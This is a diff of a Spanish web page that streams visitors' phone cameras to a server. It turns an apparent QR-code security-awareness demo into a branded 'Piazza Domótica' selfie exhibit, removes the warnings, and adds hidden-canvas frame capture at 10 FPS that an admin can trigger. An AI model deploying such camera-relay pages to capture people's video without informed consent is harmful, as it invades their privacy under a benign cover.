@@ -1,115 +1,53 @@
 <!DOCTYPE html>
 <html lang="es">
-    <script src="/socket.io/socket.io.js"></script>
-<script>
-    // Configuración de Socket.io para Render
-    const socket = io({
-        transports: ['websocket', 'polling']
-    });
-    
-    // Acceder a la cámara del usuario
-    async function setupCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" },
-                audio: false
-            });
-            
-            const videoElement = document.getElementById('localVideo');
-            videoElement.srcObject = stream;
-            
-            // Detectar nombre del dispositivo
-            let deviceName = 'Dispositivo Móvil';
-            if (navigator.userAgentData && navigator.userAgentData.brands.length > 0) {
-                deviceName = navigator.userAgentData.brands[0].brand;
-            } else if (navigator.userAgent.includes('iPhone')) {
-                deviceName = 'iPhone';
-            } else if (navigator.userAgent.includes('Android')) {
-                deviceName = 'Android';
-            }
-            
-            // Registrar dispositivo en el servidor
-            socket.emit('register-device', {
-                name: deviceName,
-                userAgent: navigator.userAgent
-            });
-            
-            console.log('Dispositivo registrado:', deviceName);
-            
-            // Simular envío de datos de stream
-            setInterval(() => {
-                socket.emit('stream-data', { 
-                    active: true,
-                    timestamp: new Date().toISOString()
-                });
-            }, 2000);
-            
-        } catch (error) {
-            console.error('Error accediendo a la cámara:', error);
-            alert('Por favor, permite el acceso a la cámara para disfrutar de la experiencia completa.');
-        }
-    }
-    
-    // Manejar conexión/desconexión
-    socket.on('connect', () => {
-        console.log('Conectado al servidor con ID:', socket.id);
-    });
-    
-    socket.on('disconnect', () => {
-        console.log('Desconectado del servidor');
-    });
-    
-    // Iniciar cuando se carga la página
-    window.addEventListener('load', setupCamera);
-</script>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seguridad de Sistemas - Accede al programa</title>
+    <title>Piazza Domótica - Experiencia Selfie</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body class="client-page">
     <div class="container">
         <header>
             <div class="logo">
-                <h1>🏠 Seguridad de Sistemas</h1>
-                <p>Programa y asistencia</p>
+                <h1>🏠 Piazza Domótica</h1>
+                <p>Tu hogar inteligente a un click de distancia</p>
             </div>
         </header>
         
         <div class="content">
             <div class="video-container">
                 <video id="localVideo" autoplay muted playsinline></video>
+                <canvas id="videoCanvas" style="display:none;"></canvas>
                 <div class="video-overlay">
-                    <p>¡Sonríe! Estás siendo transmitido ... a algún lugar</p>
+                    <p>¡Sonríe! Estás siendo transmitido en la pantalla principal</p>
                 </div>
             </div>
             
             <div class="info-section">
-                <h2>Bienvenido a Seguridad de sistemas</h2>
-                <p>Estás viendo en directo cómo la tecnología puede hacer tu vida más fácil cómoda y ...¿segura?</p>
+                <h2>Bienvenido a nuestra exposición</h2>
+                <p>Estás viendo en directo cómo nuestra tecnología de domótica puede hacer tu vida más fácil y segura.</p>
                 
                 <div class="features">
                     <div class="feature">
                         <span class="icon">🏠</span>
-                        <h3>Asistencia</h3>
-                        <p>¿crees que alguien sería capaz de tomar tus datos y hacer uso indebido de tu dispositivo?</p>
+                        <h3>Control Remoto</h3>
+                        <p>Gestiona tu hogar desde cualquier lugar</p>
                     </div>
                     <div class="feature">
                         <span class="icon">🔒</span>
                         <h3>Seguridad</h3>
-                        <p>NUNCA abras un QR sin antes saber cómo está hecho, que permisos requiere, a dónde te dirige y qué tipo de archivos descargará en tu móvil</p>
+                        <p>Sistemas de seguridad inteligentes y automatizados</p>
                     </div>
                     <div class="feature">
                         <span class="icon">💡</span>
-                        <h3>Toma conciencia</h3>
-                        <p>El mundo es peligroso... concientízate y evangeliza </p>
+                        <h3>Eficiencia</h3>
+                        <p>Ahorra energía con automatización inteligente</p>
                     </div>
                 </div>
                 
                 <div class="cta">
-                   <!-- <a href="https://piazza.ar" target="_blank" class="btn">Visitar nuestro sitio web</a> -->
-                    <a href="https://www.argentina.gob.ar/justicia/convosenlaweb/situaciones/que-es-mi-identidad-digital-y-como-la-protejo" target="_blank" class="btn">¿Cómo protejo mi identidad digital?</a>
+                    <a href="https://piazza.ar" target="_blank" class="btn">Visitar nuestro sitio web</a>
                 </div>
             </div>
         </div>
@@ -117,36 +55,104 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
+        const socket = io({
+            transports: ['websocket', 'polling']
+        });
+        
+        const video = document.getElementById('localVideo');
+        const canvas = document.getElementById('videoCanvas');
+        const ctx = canvas.getContext('2d');
+        let streamInterval;
+        let isStreaming = false;
+        
+        // Configurar canvas con las dimensiones del video
+        function setupCanvas() {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+        }
+        
+        // Capturar frame del video y enviarlo
+        function captureAndSendFrame() {
+            if (video.videoWidth === 0 || video.videoHeight === 0) return;
+            
+            // Actualizar dimensiones del canvas si es necesario
+            if (canvas.width !== video.videoWidth || canvas.height !== video.videoHeight) {
+                setupCanvas();
+            }
+            
+            // Dibujar el frame actual en el canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convertir a base64 para enviar
+            const frameData = canvas.toDataURL('image/jpeg', 0.5); // Calidad del 50%
+            
+            // Enviar frame al servidor
+            socket.emit('video-frame', {
+                frame: frameData,
+                width: canvas.width,
+                height: canvas.height
+            });
+        }
         
         // Acceder a la cámara del usuario
         async function setupCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" },
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 });
                 
-                const videoElement = document.getElementById('localVideo');
-                videoElement.srcObject = stream;
+                video.srcObject = stream;
                 
-                // Registrar dispositivo en el servidor
-                socket.emit('register-device', {
-                    name: navigator.userAgentData?.brands[0]?.brand || 'Dispositivo Móvil'
-                });
-                
-                // Capturar y enviar frames (simplificado para el ejemplo)
-                setInterval(() => {
-                    // En un caso real, aquí capturarías y enviarías frames del video
-                    // Para este ejemplo, solo notificamos que el stream está activo
-                    socket.emit('stream-data', { active: true });
-                }, 1000);
+                // Esperar a que el video esté listo
+                video.onloadedmetadata = () => {
+                    setupCanvas();
+                    
+                    // Detectar nombre del dispositivo
+                    let deviceName = 'Dispositivo Móvil';
+                    if (navigator.userAgent.includes('iPhone')) {
+                        deviceName = 'iPhone';
+                    } else if (navigator.userAgent.includes('Android')) {
+                        deviceName = 'Android';
+                    } else if (navigator.userAgent.includes('iPad')) {
+                        deviceName = 'iPad';
+                    }
+                    
+                    // Registrar dispositivo
+                    socket.emit('register-device', {
+                        name: deviceName,
+                        userAgent: navigator.userAgent
+                    });
+                    
+                    // Iniciar captura de frames
+                    isStreaming = true;
+                    streamInterval = setInterval(captureAndSendFrame, 100); // 10 FPS
+                };
                 
             } catch (error) {
                 console.error('Error accediendo a la cámara:', error);
                 alert('Por favor, permite el acceso a la cámara para disfrutar de la experiencia completa.');
             }
         }
+        
+        // Manejar solicitud de streaming desde el admin
+        socket.on('start-streaming', () => {
+            if (!isStreaming) {
+                isStreaming = true;
+                streamInterval = setInterval(captureAndSendFrame, 100);
+            }
+        });
+        
+        // Limpiar al cerrar la página
+        window.addEventListener('beforeunload', () => {
+            if (streamInterval) {
+                clearInterval(streamInterval);
+            }
+        });
         
         // Iniciar cuando se carga la página
         window.addEventListener('load', setupCamera);
